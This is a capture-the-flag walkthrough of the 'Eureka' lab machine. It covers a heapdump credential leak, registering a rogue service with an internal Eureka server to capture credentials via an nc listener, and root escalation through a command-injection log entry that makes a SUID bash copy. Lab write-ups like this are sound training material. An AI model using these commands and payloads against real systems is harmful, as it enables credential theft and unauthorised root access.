# Eureka

```
Difficulty: Hard
Operating System: Linux
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | `N/A` | Nmap, Nuclei, Heap Dump Analysis | Performed an initial Nmap and Nuclei scan to discover open ports and vulnerabilities. Identified an exposed `/actuator/heapdump` endpoint, which was downloaded and analyzed to find credentials for SSH and an internal Eureka service. |
| 2 | `oscar190` | SSH Access, Port Forwarding | Used the discovered credentials (`oscar190:0sc@XXXXXXXXXXXXXXXX`) to log in via SSH. Established a port forward to access the internal Eureka server on port 8761. |
| 3 | `miranda-wise` | Eureka Service Exploitation | Exploited the Eureka service by registering a fake microservice instance. The actual service connected to the fake instance, revealing new credentials (`miranda.wise:IL!vXXXXXXXXXXXXXX`). |
| 4 | `root` | Command Injection, SUID Binary | Analyzed a script (`log_analyse.sh`) with a command injection vulnerability. Since the user `miranda-wise` was in the `developers` group, they could modify a log file that the root-owned script processed. A malicious payload was injected into the log file. |
| 5 | `root` | Cron Job Execution | A cron job executed the vulnerable script as the `root` user, which triggered the malicious payload. This created a SUID binary of `/bin/bash`, allowing for a privileged shell and access to the `root.txt` flag. |


##  Nmap Scan

A port scan on `Eureka.htb` reveals two open ports.

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
````

The HTTP service on port 80 redirects to `furni.htb`. To proceed, you must add `furni.htb` to your `/etc/hosts` file.

-----

##  Nuclei Scan

Running a Nuclei scan on `http://furni.htb` identifies several interesting endpoints, notably the `/actuator/heapdump` endpoint, which exposes a **critical vulnerability**.

```
[springboot-heapdump] [http] [critical] [http://furni.htb/actuator/heapdump](http://furni.htb/actuator/heapdump)
```

This endpoint allows the download of a **Java heap dump**, a snapshot of the memory of the Java application.

-----

##  Analyzing the Heap Dump

The downloaded `heapdump` file can contain sensitive information. Using a tool like **JDumpSpider**, you can extract credentials and other configuration details.

```bash
❯ java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump
```

The output reveals several crucial pieces of information:

  * **MySQL Database Credentials**:

      * `username`: **oscar190**
      * `password`: **0sc@r19XXXXXXXXXXXXXXXX**
      * `url`: `jdbc:mysql://localhost:3306/Furni_WebApp_DB`

  * **Eureka Server Credentials**:

      * `username`: **EurekaSrvr**
      * `password`: **0scarXXXXXXXXXXXXX**
      * `url`: `http://EurekaSrvr:0scarXXXXXXXXXXXXX@localhost:8761/eureka/`

### SSH Access

The credentials `oscar190` and `0sc@XXXXXXXXXXXXXXXX` can be used to log in via **SSH**.

```bash
❯ ssh oscar190@furni.htb
```

-----

## 🔗 Eureka Service

The heap dump analysis showed a connection to `localhost:8761`. Checking the open ports on the machine with `ss -tuln` confirms that port 8761 is listening on all interfaces. This is the **Eureka Server**, a service discovery component often used in microservice architectures.

To interact with this service from your local machine, you need to set up an **SSH tunnel** to forward port 8761.

```bash
❯ ssh oscar190@furni.htb -L 8761:127.0.0.1:8761
```

### Exploiting Eureka

By default, Eureka servers allow **any service to register** without authentication. However, in this case, the `EurekaSrvr` credentials are required, which we already found. By registering a **malicious or fake service** to the Eureka server, we can receive sensitive information that other services might send.

The `Hacking Netflix Eureka` article provides a method for this exploit. We'll register a fake service and set its IP to our local machine, listening on port 8081.

```bash
oscar190@eureka:~$ curl -X POST http://EurekaSrvr:0scarXXXXXXXXXXXXX@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE  -H 'Content-Type: application/json' -d '{ 
  "instance": {
    "instanceId": "USER-MANAGEMENT-SERVICE",
    "hostName": "10.10.xx.xx",
    "app": "USER-MANAGEMENT-SERVICE",
    "ipAddr": "10.10.xx.xx",
    "vipAddress": "USER-MANAGEMENT-SERVICE",
    "secureVipAddress": "USER-MANAGEMENT-SERVICE",
    "status": "UP",
    "port": {   
      "$": 8081,
      "@enabled": "true"
    },
    "dataCenterInfo": {
      "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
      "name": "MyOwn"
    }
  }
}'
```

After registering the fake service, you need to listen for incoming connections on your local machine.

```bash
❯ nc -lvnp 8081
```

A short time after the registration, the genuine `user-management-service` will send a request to your listening port, disclosing a new set of credentials:

  * **Username**: **miranda.wise@furni.htb**
  * **Password**: **IL\!veXXXXXXXXXXXXXXX**

You can now use these credentials to switch to the `miranda-wise` user.

-----

## Privilege Escalation to Root

The `miranda-wise` user is part of the `developers` group. We can look for scripts or files that this group has elevated privileges on. Navigating to `/opt` reveals a script named `log_analyse.sh`.

```
miranda-wise@eureka:/opt$ ls -al
drwxrwx--- 2 root www-data 4096 Aug  7  2024 heapdump
-rwxrwxr-x  1 root root     4980 Mar 20 14:17 log_analyse.sh
```

This script is owned by `root` but can be executed and written by members of the `developers` group. A closer look at the script reveals a **command injection vulnerability**.

Specifically, the `analyze_http_statuses()` function processes log entries and compares HTTP status codes. The problematic line is:

```bash
if [[ "$existing_code" -eq "$code" ]]; then
```

The `$code` variable is populated directly from the log file using `grep -oP 'Status: \K.*'`. When the `if` condition is evaluated, it is an **arithmetic comparison**. If the `$code` variable contains a command inside `$(...)`, Bash will execute that command first.

We can exploit this by writing a malicious entry to the log file that the script will process. The log file `application.log` is located at `/var/www/web/cloud-gateway/log`, and is owned by `www-data` with group `developers`. Since `miranda-wise` is in the `developers` group, we can modify this file.

### Exploitation Steps

1.  **Remove the existing log file** to ensure our malicious entry is at the beginning.

    ```bash
    miranda-wise@eureka:/var/www/web/cloud-gateway/log$ rm application.log
    ```

2.  **Add a malicious log entry** to the new `application.log` file. This entry will execute a command to create a **setuid binary** of `/bin/bash` in the `/tmp` directory.

    ```bash
    miranda-wise@eureka:/var/www/web/cloud-gateway/log$ echo 'HTTP Status: x[$(cp /bin/bash /tmp/bash;chmod u+s /tmp/bash)]' >> application.log
    ```

3.  Wait for the `log_analyse.sh` script to be executed, which will be triggered by a scheduled job (e.g., cron job).

4.  After a few moments, the `log_analyse.sh` script will run as `root`, execute the command inside `[...]`, and create the setuid binary. You can now execute `/tmp/bash` with `root` privileges.

    ```bash
    miranda-wise@eureka:/$ /tmp/bash -p
    # whoami
    root
    ```

-----

## Summary

  * **User Compromise**: An exposed Spring Boot heap dump provided database and internal service credentials. The database credentials led to an initial SSH foothold. The internal Eureka server credentials were used to register a fake service, which received login credentials for another user, `miranda-wise`.
  * **Privilege Escalation**: The `miranda-wise` user was able to exploit a **command injection vulnerability** in a root-owned `log_analyse.sh` script. By manipulating a log file that the user could write to, a setuid binary of `bash` was created, granting `root` access.


**Pwned! Eureka**